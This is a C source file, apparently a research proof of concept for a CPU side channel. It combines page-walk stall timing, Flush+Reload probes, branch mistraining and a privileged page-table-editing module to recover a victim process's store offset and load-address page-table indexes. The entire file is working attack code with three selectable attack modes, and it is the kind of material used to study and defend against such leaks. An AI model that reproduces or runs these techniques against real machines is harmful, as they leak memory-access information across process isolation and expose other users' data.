#define _GNU_SOURCE

#include <signal.h>
#include <stdio.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>

#include "utils.h"
#include "ptedit_header.h"

static u32 threshold; // cache hit threshold
static u8 *victim_page, *normal_page, *probe, *garbage; // some handy pages

// assuming 4KB page and 4-level PT
#define PAGE_SHIFT (12u)
#define PAGE_SIZE (1u << PAGE_SHIFT)
#define INDEX_WIDTH (9u)
#define INDEX_COUNT (1u << INDEX_WIDTH)
#define INDEX_MASK (INDEX_COUNT - 1)

// allocate PRIVATE memory and initialize it
static u8 *setup_page(size_t size, u8 init) {
    u8 *page = mmap(NULL /* addr */, size, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1 /* fd */, 0 /* offset */);
    if (page == MAP_FAILED) {
        return NULL;
    }
    memset(page, init, size);
    return page;
}

// get index for a given pointer and a level of page table
// PGD (level 4) -> PUD (level 3) -> PMD (level 2) -> PTE (level 1)
static u16 get_PL_index(void *ptr, u8 level) {
    u64 page = ((uintptr_t)ptr >> PAGE_SHIFT);
    return (page >> ((level - 1) * INDEX_WIDTH)) & INDEX_MASK;
}

// we only need one bit of information to indicate if page walk stalls,
// therefore, we only need a probe array with one element, and it will be
// accessed if page walk does not stall. So, we will have something like this:
// probe[*load], if page walk does not stall, *load returns 0 and probe[0] is
// acessed. However, we want *load to return a non-zero if page walk does not
// stall, since zero can be a default value used for some forwarding (e.g.,
// Meltdown), so we use an array with two pages and access probe[1 * page_size].
static void flush_probe() {
    _clflush(probe + PAGE_SIZE);
}

static bool check_probe() {
    return _time_maccess(&probe[PAGE_SIZE], 1 /* byte */) < threshold;
}
// end of util functions

#define VICTIM_STORE_OFFSET (0x888u)
static int __attribute__((noinline)) store_offset_recovery() {
    int ret = 0;
    // use the first (MISTRAIN_EPOCH - 1) iters to mistrain, then mispredict
    const u16 MISTRAIN_EPOCH = 6;
    const u32 MEASURES = 100;
    static volatile u64 _size1 = 10, _size2 = 11,
                        _size3 = 12; // slow branch gadgets

    pid_t pid = fork();
    if (pid == 0) {
        usleep(200);
        while (true) {
            // normal_page is NOT shared, the child process will make a copy on
            // write
            _mwrite(&normal_page[VICTIM_STORE_OFFSET], 0xff);
        }
    } else if (pid < 0) {
        fprintf(stderr, "Failed to fork.\n");
        return 2;
    }

    // allocate 512 pages to cover all possible PL1 (PTE) indexes
    u8 *pages = setup_page(INDEX_COUNT * PAGE_SIZE, 0x1 /* init value */);
    if (!pages) {
        ret = 3;
        goto mmap_fail;
    }

    usleep(rand() % 256);
    for (u32 disp = 0; disp < INDEX_COUNT; disp++) {
        u8 *ptr = pages + disp * PAGE_SIZE;
        u32 counter = 0;
        for (size_t cnt = 1; cnt <= MEASURES * MISTRAIN_EPOCH; cnt++) {
            flush_probe(); // prepare F+R probe
            _clflush_v(&_size1); // create long latency branch
            _clflush_v(&_size2);
            _clflush_v(&_size3);
            ptedit_invalidate_tlb(ptr);
            _mfence();

            // tmp will be all ones (-1) if cnt % MISTRAIN_EPOCH == 0;
            // i.e., it's time to mispredict
            u64 tmp = ((cnt % MISTRAIN_EPOCH) - 1) & (~0xffff);
            tmp = tmp | (tmp >> 16);

            // only select probe on misprediction (i.e., tmp = -1)
            // equivalent to arr = tmp ? probe : garbage, but branchless
            u8 *arr = (u8 *)SEL_NOSPEC(tmp, probe, garbage);
            _lfence();
            if ((tmp < _size1) & (tmp < _size2) & (tmp < _size3)) {
                // on misprediction, arr points to probe if *ptr is NOT stalled,
                // we can observe signals from probe[PAGE_SIZE]
                _maccess(&arr[*ptr * PAGE_SIZE]);
            }
            _lfence();

            // check if *ptr successfully returns 0x1 during misprediction
            if (tmp && check_probe()) {
                counter += 1;
            }
        }

        u16 pte_offset = ((uintptr_t)ptr & 0x1ff000) >> 9;
        printf("%#5x\t%3d\n", pte_offset, counter);
    }

    munmap(pages, INDEX_COUNT * PAGE_SIZE);
mmap_fail:
    kill(pid, SIGKILL);
    return ret;
}

#define VICTIM_LOAD_ADDR (0x439948621000ull)
static int __attribute__((noinline)) load_page_recovery_throughput() {
    int ret;
    const u32 MEASURES = 100, REPEATS = 100000;
    const i32 WARMUP = 10;

    // a page with PL4_index = 0x87, PL3_index = 0x65,
    // PL2_index = 0x43, PL1_index = 0x21
    u8 *page = mmap((void *)VICTIM_LOAD_ADDR /* addr */, PAGE_SIZE,
                    PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,
                    -1 /* fd */, 0 /* offset */);
    if (page == MAP_FAILED) {
        return 1;
    }

    fprintf(stderr, "Oracles:\n");
    fprintf(stderr, "\tPL4 index: %#x\n", get_PL_index(page, 4));
    fprintf(stderr, "\tPL3 index: %#x\n", get_PL_index(page, 3));
    fprintf(stderr, "\tPL2 index: %#x\n", get_PL_index(page, 2));
    fprintf(stderr, "\tPL1 index: %#x\n", get_PL_index(page, 1));

    // shared variable controls when to measure throughput in sender
    volatile u8 *start =
        mmap(NULL /* addr */, sizeof(u8), PROT_READ | PROT_WRITE,
             MAP_SHARED | MAP_ANONYMOUS, -1 /* fd */, 0 /* offset */);
    // shared page to store throughput results
    u64 *counts = mmap(NULL /* addr */, PAGE_SIZE, PROT_READ | PROT_WRITE,
                       MAP_SHARED | MAP_ANONYMOUS, -1 /* fd */, 0 /* offset */);
    if (start == MAP_FAILED || counts == MAP_FAILED) {
        return 1;
    }
    *start = 0;
    memset(counts, 0 /* init value */, PAGE_SIZE);

    pid_t pid = fork();
    if (pid == 0) {
        // sender
        i32 idx = -WARMUP;
        usleep(rand() % 256);

        while (true) {
            u64 cnt = 0;
            while (!*start); /* busy wait */

            // start throughput measurement, we should observe a lower
            // throughput if _maccess(page)'s page walk is stalled a lot
            while (*start) {
                ptedit_invalidate_tlb(page);
                _maccess(page);
                _lfence();
                cnt += 1;
            }
            // save throughput results
            if (idx >= 0)
                counts[idx % (PAGE_SIZE / sizeof(u64))] = cnt;
            idx++;
        }
    } else if (pid < 0) {
        fprintf(stderr, "Failed to fork.\n");
        return 2;
    }

    // receiver
    for (u32 iter = 0; iter < INDEX_COUNT + WARMUP; iter++) {
        u8 *ptr;
        if (iter >= WARMUP) {
            ptr = victim_page + ((iter - WARMUP) << 3); // align to 8-byte
        } else {
            ptr = garbage;
        }
        usleep(rand() % 256);
        *start = 1; // start measurement in sender
        _mfence();
        _lfence();
        for (u32 rept = 0; rept < REPEATS; rept++) {
            // attempt to stall page walks in sender
            _mwrite(ptr, 0xff /* value to write */);
        }
        *start = 0; // end measurement
        _mfence();
        _lfence();
    }

    for (u32 disp = 0; disp < INDEX_COUNT; disp++) {
        printf("%#5x\t%lu\n", disp, counts[disp]);
    }

    kill(pid, SIGKILL);
    munmap(counts, PAGE_SIZE);
    munmap((u8 *)start, sizeof(u8));
    munmap(page, PAGE_SIZE);
    return ret;
}

static int __attribute__((noinline)) load_page_recovery_contention() {
    int ret;
    const u32 MEASURES = 50, REPEATS = 10000;
    const i32 WARMUP = 10;

    // a page with PL4_index = 0x87, PL3_index = 0x65,
    // PL2_index = 0x43, PL1_index = 0x21
    u8 *page = mmap((void *)VICTIM_LOAD_ADDR /* addr */, PAGE_SIZE,
                    PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,
                    -1 /* fd */, 0 /* offset */);
    if (page == MAP_FAILED) {
        return 1;
    }

    fprintf(stderr, "Oracles:\n");
    fprintf(stderr, "\tPL4 index: %#x\n", get_PL_index(page, 4));
    fprintf(stderr, "\tPL3 index: %#x\n", get_PL_index(page, 3));
    fprintf(stderr, "\tPL2 index: %#x\n", get_PL_index(page, 2));
    fprintf(stderr, "\tPL1 index: %#x\n", get_PL_index(page, 1));

    pid_t pid = fork();
    if (pid == 0) {
        usleep(rand() % 256);
        u32 idx = 0;
        while (true) {
            ptedit_invalidate_tlb(page);
            _maccess(page);
        }
    } else if (pid < 0) {
        fprintf(stderr, "Failed to fork.\n");
        return 2;
    }

    for (u32 iter = 0; iter < INDEX_COUNT + WARMUP; iter++) {
        u32 disp = iter - WARMUP;
        u8 *ptr;
        if (iter >= WARMUP) {
            ptr = victim_page + (disp << 3); // align to 8-byte
        } else {
            ptr = garbage;
        }
        u32 sig;
        u64 total_time = 0, t_start;
        usleep(rand() % 256);
        // measure execution latency for MEASURES times
        // we should observe a smaller latency if our store stalls page walk
        // in the sender, since more L1D resources would be available
        for (u32 cnt = 0; cnt < MEASURES; cnt++) {
            t_start = _rdtscp(&sig);
            for (u32 rept = 0; rept < REPEATS; rept++) {
                _mwrite(ptr, 0xff /* value to write */);
            }
            total_time += _rdtscp(&sig) - t_start;
        }
        if (iter > WARMUP)
            printf("%#5x\t%lu\n", disp, total_time / MEASURES);
    }

    kill(pid, SIGKILL);
    munmap(page, PAGE_SIZE);
    return ret;
}

#define STORE_OFFSET_POC "store_offset"
#define LOAD_PAGE_TRP_POC "load_page_throughput"
#define LOAD_PAGE_CTT_POC "load_page_contention"

int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "Expect one of these arguments:\n"
                        "\t" STORE_OFFSET_POC "\n"
                        "\t" LOAD_PAGE_TRP_POC "\n"
                        "\t" LOAD_PAGE_CTT_POC "\n");
        return 1;
    }

    if (ptedit_init()) {
        fprintf(stderr, "Failed to initialize PTEditor, "
                        "is the kernel module loaded?\n");
        return -1;
    }
    int ret = 0;

    threshold = _get_cache_hit_threshold();
    fprintf(stderr, "Cache Hit Threshold: %u\n", threshold);

    victim_page = setup_page(PAGE_SIZE, 0x1 /* init value */);
    normal_page = setup_page(PAGE_SIZE, 0x2);
    probe = setup_page(PAGE_SIZE * 2, 0x0);
    garbage = setup_page(PAGE_SIZE * 2, 0x0);
    if (!victim_page || !normal_page || !probe || !garbage) {
        fprintf(stderr, "Failed to allocate pages.\n");
        ret = -2;
        goto mmap_fail;
    }

    srand(0);
    if (strcmp(argv[1], STORE_OFFSET_POC) == 0) {
        ret = store_offset_recovery();
    } else if (strcmp(argv[1], LOAD_PAGE_TRP_POC) == 0) {
        ret = load_page_recovery_throughput();
    } else if (strcmp(argv[1], LOAD_PAGE_CTT_POC) == 0) {
        ret = load_page_recovery_contention();
    } else {
        fprintf(stderr, "Unknown argument \"%s\"", argv[1]);
        goto arg_fail;
    }

arg_fail:
mmap_fail:
    munmap(victim_page, PAGE_SIZE);
    munmap(normal_page, PAGE_SIZE);
    munmap(probe, PAGE_SIZE * 2);
    munmap(garbage, PAGE_SIZE * 2);
    ptedit_cleanup();
    return ret;
}
